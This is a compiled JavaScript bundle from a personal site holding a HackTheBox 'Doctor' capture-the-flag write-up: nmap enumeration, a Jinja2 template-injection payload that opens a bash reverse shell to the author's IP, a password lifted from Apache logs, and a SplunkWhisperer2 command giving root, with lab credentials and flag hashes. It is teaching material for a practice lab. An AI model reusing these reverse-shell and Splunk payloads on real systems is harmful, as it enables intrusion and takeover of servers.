"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[1208],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>m});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var s=a.createContext({}),p=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(s.Provider,{value:t},e.children)},u="mdxType",h={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,s=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=p(n),d=r,m=u["".concat(s,".").concat(d)]||u[d]||h[d]||o;return n?a.createElement(m,i(i({ref:t},c),{},{components:n})):a.createElement(m,i({ref:t},c))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=d;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l[u]="string"==typeof e?e:r,i[1]=l;for(var p=2;p<o;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},41541:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>i,default:()=>h,frontMatter:()=>o,metadata:()=>l,toc:()=>p});var a=n(87462),r=(n(67294),n(3905));const o={layout:"post",title:"Doctor ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","ssti","splunk","python","jinja"],date:"2021/02/15 20:47:00",thumbnail:"/img/HackTheBox/doctor.png",toc:!0},i="Information",l={unversionedId:"HackTheBox/Doctor/write-up",id:"HackTheBox/Doctor/write-up",title:"Doctor ",description:"- Name: Doctor",source:"@site/writeups/HackTheBox/Doctor/write-up.md",sourceDirName:"HackTheBox/Doctor",slug:"/HackTheBox/Doctor/write-up",permalink:"/writeups/HackTheBox/Doctor/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"ssti",permalink:"/writeups/tags/ssti"},{label:"splunk",permalink:"/writeups/tags/splunk"},{label:"python",permalink:"/writeups/tags/python"},{label:"jinja",permalink:"/writeups/tags/jinja"}],version:"current",frontMatter:{layout:"post",title:"Doctor ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","ssti","splunk","python","jinja"],date:"2021/02/15 20:47:00",thumbnail:"/img/HackTheBox/doctor.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Delivery ",permalink:"/writeups/HackTheBox/Delivery/write-up"},next:{title:"Dyplesher ",permalink:"/writeups/HackTheBox/Dyplesher/write-up"}},s={},p=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"Web discovery",id:"web-discovery",level:2},{value:"Web exploitation: SSTI",id:"web-exploitation-ssti",level:2},{value:"Privilege Escalation of Machine : from web to shaun",id:"privilege-escalation-of-machine--from-web-to-shaun",level:2},{value:"Privilege Escalation of Machine : from shaun to root",id:"privilege-escalation-of-machine--from-shaun-to-root",level:2}],c={toc:p},u="wrapper";function h(e){let{components:t,...o}=e;return(0,r.kt)(u,(0,a.Z)({},c,o,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"information"},"Information"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Name:")," Doctor"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Profile:")," ",(0,r.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/278"},"www.hackthebox.eu")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Points:")," 20")),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Doctor",src:n(32120).Z,width:"598",height:"381"})),(0,r.kt)("h2",{id:"overview"},"Overview"),(0,r.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ pacman -S nmap pwncat payloadsallthethings\n")),(0,r.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,r.kt)("p",null,"Port and service scan with nmap:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"# Nmap 7.91 scan initiated Sun Feb 14 19:31:04 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.209\nNmap scan report for 10.10.10.209\nHost is up (0.056s latency).\nNot shown: 65532 filtered ports\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)\n|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)\n|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)\n80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))\n| http-methods:\n|_  Supported Methods: POST OPTIONS HEAD GET\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Doctor\n8089/tcp open  ssl/http Splunkd httpd\n| http-methods:\n|_  Supported Methods: GET HEAD OPTIONS\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-server-header: Splunkd\n|_http-title: splunkd\n| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser\n| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2020-09-06T15:57:27\n| Not valid after:  2023-09-06T15:57:27\n| MD5:   db23 4e5c 546d 8895 0f5f 8f42 5e90 6787\n|_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sun Feb 14 19:33:51 2021 -- 1 IP address (1 host up) scanned in 166.52 seconds\n")),(0,r.kt)("h2",{id:"web-discovery"},"Web discovery"),(0,r.kt)("p",null,"Browsing with the IP address we have nothing fancy but we can find a reference\nto ",(0,r.kt)("inlineCode",{parentName:"p"},"doctors.htb"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ curl -s http://10.10.10.209/ | grep doctor\n              <strong>info@doctors.htb</strong>\n")),(0,r.kt)("p",null,"So lets' add it to ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/hosts"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ grep doctor /etc/hosts\n10.10.10.209 doctors.htb\n")),(0,r.kt)("p",null,"Now browsing ",(0,r.kt)("a",{parentName:"p",href:"http://doctors.htb/"},"http://doctors.htb/")," we access an app called ",(0,r.kt)("em",{parentName:"p"},"Doctor Secure Messaging"),"."),(0,r.kt)("p",null,"We can register an account and login."),(0,r.kt)("p",null,"At ",(0,r.kt)("a",{parentName:"p",href:"http://doctors.htb/post/new"},"http://doctors.htb/post/new")," there is a feature where we can post a message."),(0,r.kt)("p",null,"There is a HTML comment:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},'\x3c!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>--\x3e\n')),(0,r.kt)("p",null,"The source code of ",(0,r.kt)("a",{parentName:"p",href:"http://doctors.htb/archive"},"http://doctors.htb/archive")," is displaying the following XML\ncontent:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml"},'    <?xml version="1.0" encoding="UTF-8" ?>\n    <rss version="2.0">\n    <channel>\n    <title>Archive</title>\n')),(0,r.kt)("p",null,"It looks like a RSS feed. If I create a post, an entry appears under the RSS\nfeed:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml"},'    <?xml version="1.0" encoding="UTF-8" ?>\n    <rss version="2.0">\n    <channel>\n     <title>Archive</title>\n     <item><title>Test title</title></item>\n\n            </channel>\n')),(0,r.kt)("h2",{id:"web-exploitation-ssti"},"Web exploitation: SSTI"),(0,r.kt)("p",null,"We can try to inject a ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"},"SSTI"),"\npayload to see if it is executed and reflected."),(0,r.kt)("p",null,'As the box is not realistic and most challenge "developers" only know\npython and never try another language so it\'s almost safe to assume the\nweb app is coded in python and the template engine will be Jinja2.'),(0,r.kt)("p",null,"Let's try ",(0,r.kt)("inlineCode",{parentName:"p"},"{{ 7*7 }}"),", on the RSS feed we can see ",(0,r.kt)("inlineCode",{parentName:"p"},"<item><title>49</title></item>"),"\nso we know the payload is executed."),(0,r.kt)("p",null,"Let's directly try a simple RCE to get a reverse shell:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},"{{config.__class__.__init__.__globals__['os'].popen('/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.169/9999 0>&1\"').read()}}\n")),(0,r.kt)("p",null,"After triggering the RSS feed I received the connection on my listener:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ pwncat -l 9999 -vv\nINFO: Listening on :::9999 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)\nINFO: Client connected from 10.10.10.209:50334 (family 2/IPv4, TCP)\nbash: cannot set terminal process group (864): Inappropriate ioctl for device\nbash: no job control in this shell\nweb@doctor:~$\n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-web-to-shaun"},"Privilege Escalation of Machine : from web to shaun"),(0,r.kt)("p",null,"Interestingly the user we have is in the ",(0,r.kt)("inlineCode",{parentName:"p"},"adm")," group, this means it can\nread ",(0,r.kt)("inlineCode",{parentName:"p"},"/var/log/"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"web@doctor:~$ id\nuid=1001(web) gid=1001(web) groups=1001(web),4(adm)\n")),(0,r.kt)("p",null,"Let's check users with a shell to know which user target next:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"web@doctor:~$ grep bash /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nweb:x:1001:1001:,,,:/home/web:/bin/bash\nshaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash\nsplunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash\n")),(0,r.kt)("p",null,"As we are in ",(0,r.kt)("inlineCode",{parentName:"p"},"adm")," group I directly targeted ",(0,r.kt)("inlineCode",{parentName:"p"},"/var/log/"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},'web@doctor:~$ grep -r password /var/logs\n...\n/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"\n...\n')),(0,r.kt)("p",null,"Warning: guessing involved here for 2 things:"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"the author thinks that it's common for passwords to be accidentally entered into the email field"),(0,r.kt)("li",{parentName:"ol"},"find the this password is owned by ",(0,r.kt)("inlineCode",{parentName:"li"},"shaun"))),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"web@doctor:~$ su shaun\nPassword: Guitar123\n\nshaun@doctor:/home/web$ cd\n\nshaun@doctor:~$ id\nuid=1002(shaun) gid=1002(shaun) groups=1002(shaun)\n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-shaun-to-root"},"Privilege Escalation of Machine : from shaun to root"),(0,r.kt)("p",null,"We have not used Splunk yet, it must be involved in next step."),(0,r.kt)("p",null,"A French pentester, ",(0,r.kt)("em",{parentName:"p"},"Cl\xe9ment Notin"),", wrote an article entitled\n",(0,r.kt)("a",{parentName:"p",href:"https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/"},"Splunk Universal Forwarder Hijacking 2: SplunkWhisperer2"),"\nand also made available an associated ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/cnotin/SplunkWhisperer2"},"exploit"),"."),(0,r.kt)("p",null,"Let's check the prerequisites:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Universal Forwarder Agents running (on port 8089)"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"splunkd")," is running as root"),(0,r.kt)("li",{parentName:"ul"},"credentials, guessing again, shaun creds are re-used for the splunk agent (totally realistic)")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ ps -ef f | grep splunk\nroot        1141       1  0 21:19 ?        Sl     0:01 splunkd -p 8089 start\nroot        1143    1141  0 21:19 ?        Ss     0:00  \\_ [splunkd pid=1141] splunkd -p 8089 start [process-runner]\n")),(0,r.kt)("p",null,"Let's exploit the guesbox now:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ git clone https://github.com/cnotin/SplunkWhisperer2\n$ cd SplunkWhisperer2/PySplunkWhispherer2/\n$ python PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.169 --username shaun --password Guitar123 --payload '/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.169/8888 0>&1\"'\n")),(0,r.kt)("p",null,"Enjoy:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ pwncat -l 8888 -vv\nINFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP)\nINFO: Client connected from 10.10.10.209:35294 (family 2/IPv4, TCP)\nbash: cannot set terminal process group (1143): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@doctor:/# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@doctor:/# cat /root/root.txt\n2011c879032a897c9d4d517f7e448839\n\nroot@doctor:/# cat /home/shaun/user.txt\n95cb0c0321ccb5c5cc4d617b2c4cb2bf\n")))}h.isMDXComponent=!0},32120:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/doctor-5039a9caa5117ee83ca4f2b11173febb.png"}}]);